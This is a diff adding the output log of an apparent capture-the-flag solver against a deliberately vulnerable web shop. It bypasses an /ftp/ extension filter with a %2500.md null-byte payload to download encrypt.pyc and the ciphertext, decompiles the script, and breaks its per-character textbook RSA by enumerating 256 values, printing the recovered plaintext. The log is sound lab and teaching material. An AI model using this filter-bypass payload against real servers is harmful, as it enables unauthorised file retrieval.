@@ -1,0 +1,45 @@
+[*] 1. Retrieve encrypt.pyc through the /ftp/ extension filter
+    GET /ftp/encrypt.pyc -> HTTP 403 (blocked)
+    GET /ftp/encrypt.pyc%2500.md -> HTTP 200 (573 B)
+    magic=03f30d0a (ver=0xf303) -> CPython 2.7 bytecode, source-size field=99, 573 bytes on disk
+    header mtime field=1590007586 (0 == wiped; real ts is 1590007586 in code obj)
+[*] 2. Decompile (uncompyle6) and disassemble (xdis) for cross-checking
+    source -> /workspace/loot/encrypt_decompiled.py  disasm -> /workspace/loot/encrypt_disasm.txt
+    --- decompiled body ---
+    # uncompyle6 version 3.9.3
+    # Python bytecode version base 2.7 (62211)
+    # Decompiled from: Python 3.14.7 (main, Sep 13 2026, 08:30:29) [GCC 16.2.0]
+    # Embedded file name: encrypt.py
+    # Compiled at: 2020-05-20 20:46:26
+    confidential_document = open('announcement.md', 'r')
+    N = 145906768007583323230186939349070635292401872375357164399581871019873438799005358938369571402670149802121818086292467422828157022922076746906543401224889672472407926969987100581290103199317858753663710862357656510507883714297115637342788911463535102712032765166518411726859837988672111837205085526346618740053L
+    e = 65537
+    encrypted_document = open('announcement_encrypted.md', 'w')
+    for char in confidential_document.read():
+        encrypted_document.write(str(pow(ord(char), e, N)) + '\n')
+    
+    encrypted_document.close()
+    return
+    
+    # okay decompiling /workspace/loot/encrypt.pyc
+    -----------------------
+    extracted N (1024 bit), e=65537
+[*] 3. Verify the algorithm reproduces the published ciphertext
+    GET /ftp/announcement_encrypted.md%2500.md -> HTTP 200 (369237 B)
+    ciphertext entries=1194 unique=43
+    first line matches ord('M')**e mod N -> algorithm confirmed
+[*] 4. Break it: no padding + 1-char blocks => keyspace is only 256 values
+    enumerated 256 candidate symbols; unmapped ciphertexts=0
+[*] 5. Integrity check: re-encrypting the recovered text must match byte-for-byte
+    re-encrypt identical to file: True
+
+[+] VULNERABLE: encrypt.pyc retrieved, decompiled and its 'encryption' broken without factoring N.
+    N bits = 1024 (public modulus, never needed)
+    recovered 1194 chars -> /workspace/loot/announcement_decrypted.md
+
+    --- first 400 chars of recovered plaintext ---
+    Major Announcement:
+    
+    Token Sale - Initial Coin Offering
+    
+    Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur sadipsci
